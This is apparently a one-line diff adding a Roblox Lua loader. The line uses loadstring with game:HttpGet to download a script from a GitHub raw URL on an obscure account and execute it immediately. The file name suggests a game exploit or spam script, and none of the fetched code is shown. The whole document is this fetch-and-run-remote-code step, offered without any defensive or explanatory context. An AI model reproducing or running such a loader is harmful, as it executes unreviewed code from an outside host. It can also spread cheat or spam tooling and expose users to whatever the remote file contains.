@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/huss-valley-spam4-ffzo8dlrnu6rhr.lua"))()
